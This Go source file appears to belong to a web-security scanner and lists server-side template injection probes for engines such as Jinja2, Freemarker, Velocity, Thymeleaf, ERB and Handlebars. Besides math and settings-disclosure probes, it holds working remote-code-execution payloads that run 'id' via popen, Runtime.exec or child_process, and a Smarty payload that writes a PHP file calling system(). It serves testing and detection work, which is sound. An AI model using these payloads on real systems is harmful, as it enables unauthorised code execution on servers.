package ssti

import (
	"fmt"
	"regexp"

	"github.com/waftester/waftester/pkg/finding"
)

func (d *Detector) jinja2Payloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		// Math probes
		{
			Template:       fmt.Sprintf("{{%d*%d}}", a, b),
			Engine:         EngineJinja2,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Jinja2 basic math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("{{ %d * %d }}", a, b),
			Engine:         EngineJinja2,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Jinja2 spaced math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("{%%print(%d*%d)%%}", a, b),
			Engine:         EngineJinja2,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Jinja2 print statement",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		// Detection probes
		{
			Template:       "{{7*'7'}}",
			Engine:         EngineJinja2,
			Type:           PayloadProbe,
			ExpectedOutput: "7777777",
			Description:    "Jinja2 string multiplication",
			Severity:       finding.High,
		},
		{
			Template:    "{{config}}",
			Engine:      EngineJinja2,
			Type:        PayloadInfoDisclosure,
			Regex:       regexp.MustCompile(`(?i)config|secret|debug`),
			Description: "Jinja2 config object access",
			Severity:    finding.Medium,
		},
		{
			Template:    "{{self}}",
			Engine:      EngineJinja2,
			Type:        PayloadInfoDisclosure,
			Regex:       regexp.MustCompile(`(?i)template|object|context`),
			Description: "Jinja2 self object access",
			Severity:    finding.Medium,
		},
		{
			Template:    "{{request.environ}}",
			Engine:      EngineJinja2,
			Type:        PayloadInfoDisclosure,
			Regex:       regexp.MustCompile(`(?i)environ|wsgi|server`),
			Description: "Jinja2 request environ access",
			Severity:    finding.Medium,
		},
	}

	// RCE payloads (not in safe mode)
	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    "{{''.__class__.__mro__[2].__subclasses__()}}",
				Engine:      EngineJinja2,
				Type:        PayloadSandboxEscape,
				Regex:       regexp.MustCompile(`(?i)subprocess|popen|os`),
				Description: "Jinja2 sandbox escape - class enumeration",
				Severity:    finding.Critical,
			},
			{
				Template:    "{{lipsum.__globals__['os'].popen('id').read()}}",
				Engine:      EngineJinja2,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Jinja2 RCE via lipsum globals",
				Severity:    finding.Critical,
			},
			{
				Template:    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
				Engine:      EngineJinja2,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Jinja2 RCE via cycler globals",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) freemarkerPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("${%d*%d}", a, b),
			Engine:         EngineFreemarker,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Freemarker math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("#{%d*%d}", a, b),
			Engine:         EngineFreemarker,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Freemarker hash math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("[=%d*%d]", a, b),
			Engine:         EngineFreemarker,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Freemarker square bracket expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:    "${.data_model}",
			Engine:      EngineFreemarker,
			Type:        PayloadInfoDisclosure,
			Regex:       regexp.MustCompile(`(?i)model|data|hash`),
			Description: "Freemarker data model access",
			Severity:    finding.Medium,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`,
				Engine:      EngineFreemarker,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Freemarker RCE via Execute",
				Severity:    finding.Critical,
			},
			{
				Template:    `${"freemarker.template.utility.Execute"?new()("id")}`,
				Engine:      EngineFreemarker,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Freemarker RCE inline Execute",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) velocityPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("#set($x=%d*%d)${x}", a, b),
			Engine:         EngineVelocity,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Velocity set and output",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("$class.inspect('java.lang.Math').type.forName('java.lang.Math').getDeclaredMethod('addExact', $class.inspect('java.lang.Integer').type, $class.inspect('java.lang.Integer').type).invoke(null, %d, %d)", a, b),
			Engine:         EngineVelocity,
			Type:           PayloadMath,
			ExpectedOutput: fmt.Sprintf("%d", a+b),
			Description:    "Velocity Math reflection",
			Severity:       finding.High,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime())$rt.exec('id')`,
				Engine:      EngineVelocity,
				Type:        PayloadRCE,
				Description: "Velocity RCE via Runtime",
				Severity:    finding.Critical,
			},
			{
				Template:    `$class.inspect('java.lang.Runtime').type.getRuntime().exec('id').waitFor()`,
				Engine:      EngineVelocity,
				Type:        PayloadRCE,
				Description: "Velocity RCE inline Runtime",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) smartyPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("{%d*%d}", a, b),
			Engine:         EngineSmarty,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Smarty math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("{math equation=\"%d*%d\"}", a, b),
			Engine:         EngineSmarty,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Smarty math tag",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:    "{$smarty.version}",
			Engine:      EngineSmarty,
			Type:        PayloadInfoDisclosure,
			Regex:       regexp.MustCompile(`[0-9]+\.[0-9]+`),
			Description: "Smarty version disclosure",
			Severity:    finding.Low,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `{php}system('id');{/php}`,
				Engine:      EngineSmarty,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Smarty RCE via php tag (Smarty < 3)",
				Severity:    finding.Critical,
			},
			{
				Template:    `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}`,
				Engine:      EngineSmarty,
				Type:        PayloadRCE,
				Description: "Smarty RCE via file write",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) makoPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("${%d*%d}", a, b),
			Engine:         EngineMako,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Mako math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("<%%\nx=%d*%d\n%%>${x}", a, b),
			Engine:         EngineMako,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Mako Python block",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `<%import os%>${os.popen('id').read()}`,
				Engine:      EngineMako,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Mako RCE via os import",
				Severity:    finding.Critical,
			},
			{
				Template:    `${self.module.cache.util.os.popen('id').read()}`,
				Engine:      EngineMako,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Mako RCE via module cache",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) erbPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("<%%= %d*%d %%>", a, b),
			Engine:         EngineERB,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "ERB math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("#{%d*%d}", a, b),
			Engine:         EngineERB,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "ERB string interpolation",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `<%= system('id') %>`,
				Engine:      EngineERB,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "ERB RCE via system",
				Severity:    finding.Critical,
			},
			{
				Template:    "<%= `id` %>",
				Engine:      EngineERB,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "ERB RCE via backticks",
				Severity:    finding.Critical,
			},
			{
				Template:    `<%= IO.popen('id').read() %>`,
				Engine:      EngineERB,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "ERB RCE via IO.popen",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) pebblePayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("{{ %d * %d }}", a, b),
			Engine:         EnginePebble,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Pebble math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `{% set cmd = 'id' %}{{ [cmd]|filter('system')|join }}`,
				Engine:      EnginePebble,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Pebble RCE via filter",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) thymeleafPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("[[${%d*%d}]]", a, b),
			Engine:         EngineThymeleaf,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Thymeleaf inline expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("__${%d*%d}__", a, b),
			Engine:         EngineThymeleaf,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Thymeleaf preprocessing",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `${T(java.lang.Runtime).getRuntime().exec('id')}`,
				Engine:      EngineThymeleaf,
				Type:        PayloadRCE,
				Description: "Thymeleaf RCE via Runtime",
				Severity:    finding.Critical,
			},
			{
				Template:    `__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()%7d__`,
				Engine:      EngineThymeleaf,
				Type:        PayloadRCE,
				Description: "Thymeleaf RCE URL encoded",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) nunjucksPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	return []*Payload{
		{
			Template:       fmt.Sprintf("{{%d*%d}}", a, b),
			Engine:         EngineNunjucks,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Nunjucks math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("{{ %d * %d }}", a, b),
			Engine:         EngineNunjucks,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Nunjucks spaced math",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:    "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
			Engine:      EngineNunjucks,
			Type:        PayloadRCE,
			Regex:       regexp.MustCompile(`uid=|gid=`),
			Description: "Nunjucks RCE via constructor",
			Severity:    finding.Critical,
		},
	}
}

func (d *Detector) handlebarsPayloads(a, b, result int) []*Payload {
	return []*Payload{
		{
			Template:    "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
			Engine:      EngineHandlebars,
			Type:        PayloadRCE,
			Regex:       regexp.MustCompile(`uid=|gid=`),
			Description: "Handlebars RCE via prototype pollution",
			Severity:    finding.Critical,
		},
	}
}

func (d *Detector) tornadoPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("{{%d*%d}}", a, b),
			Engine:         EngineTornado,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Tornado math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `{%import os%}{{os.popen('id').read()}}`,
				Engine:      EngineTornado,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Tornado RCE via import",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) djangoPayloads(a, b, result int) []*Payload {
	return []*Payload{
		{
			Template:    "{{settings}}",
			Engine:      EngineDjango,
			Type:        PayloadInfoDisclosure,
			Regex:       regexp.MustCompile(`(?i)secret|debug|database`),
			Description: "Django settings disclosure",
			Severity:    finding.Medium,
		},
		{
			Template:    "{{debug}}",
			Engine:      EngineDjango,
			Type:        PayloadInfoDisclosure,
			Description: "Django debug mode check",
			Severity:    finding.Low,
		},
	}
}

func (d *Detector) razorPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("@(%d*%d)", a, b),
			Engine:         EngineRazor,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Razor math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `@{var x = new System.Diagnostics.Process();x.StartInfo.FileName = "cmd";x.StartInfo.Arguments = "/c id";x.Start();}`,
				Engine:      EngineRazor,
				Type:        PayloadRCE,
				Description: "Razor RCE via Process",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) universalPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	// Polyglot payloads that work across multiple engines
	return []*Payload{
		{
			Template:       fmt.Sprintf("{{%d*%d}}", a, b),
			Engine:         EngineUnknown,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Universal curly brace math (Jinja2/Twig/Tornado)",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("${%d*%d}", a, b),
			Engine:         EngineUnknown,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Universal dollar brace math (Freemarker/Mako)",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("<%%= %d*%d %%>", a, b),
			Engine:         EngineUnknown,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Universal ERB-style math",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("{%d*%d}", a, b),
			Engine:         EngineUnknown,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Universal single brace math (Smarty)",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("${{%d*%d}}", a, b),
			Engine:         EngineUnknown,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Universal dollar double brace (Thymeleaf)",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
	}
}
